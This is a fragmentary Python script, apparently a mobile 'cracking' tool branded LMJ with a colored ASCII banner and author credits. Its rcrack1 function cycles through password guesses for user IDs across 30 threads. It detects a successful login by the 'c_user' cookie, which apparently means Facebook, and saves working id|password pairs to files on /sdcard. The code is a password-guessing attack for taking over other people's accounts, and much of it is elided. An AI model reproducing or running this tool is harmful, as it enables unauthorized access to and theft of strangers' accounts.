...
logo = ("""
	  			 ┌ ━━━━━━━━━━━━━━━━━━━━━┑
x1b[1;90m┃\x1b[1;92m /$$       /$$      /$$    /$$$$$            ┃
x1b[1;90m┃\x1b[1;92m| $$      | $$$    /$$$   |__  $$                 ┃
x1b[1;90m┃\x1b[1;92m| $$      | $$$$  /$$$$      | $$                 ┃
x1b[1;90m┃\x1b[1;92m| $$      | $$ $$/$$ $$      | $$                   ┃
x1b[1;90m┃\x1b[1;92m| $$      | $$  $$$| $$ /$$  | $$                 ┃
x1b[1;90m┃\x1b[1;92m| $$      | $$\  $ | $$| $$  | $$         ┃
x1b[1;90m┃\x1b[1;92m| $$$$$$$$| $$ \/  | $$|  $$$$$$/      ┃
x1b[1;90m┃\x1b[1;92m|________/|__/     |__/ \______/            ┃
                   └━━━━━━━━━━━━━━━━━━━━━┘             
                                 
                                 

\033[1;96m═════════════════════════════════════════════
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m: MD SOJIB HASAN
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94mK1NG-SOJIB-69
...
def LMJ():
    ...
    for nmp in range(limit):
        ...
        LMJ.append(nmp)
    with ThreadPool(max_workers=30) as LMJ:
        clear()
        os.system('clear')
        print(logo)
        tl = str(len(LMJ))
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;97mLMJ\033[1;97m] %s'%(loop)),
            sys.stdout.flush()
    ...
    'viewport-width': '811',}
            ...
            if 'c_user' in log_cookies:
                ...
                print(f' \033[38;5;46m[LMJ-OK] {idf} | {ps}')
                open('/sdcard/LMJ-OK.txt','a').write(idf+'|'+ps+'\n')
                ok.append(idf)
                break
                ...
                idf = "1000"+coki1[0:11]
                print(f' \033[1;31m[LMJ-CP] {idf} | {ps}' ' \n\033[1;33m [🍎] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/LMJ-CP','a').write(idf+'|'+ps+'\n')
                cp.append(idf)
                break
            else:
                continue
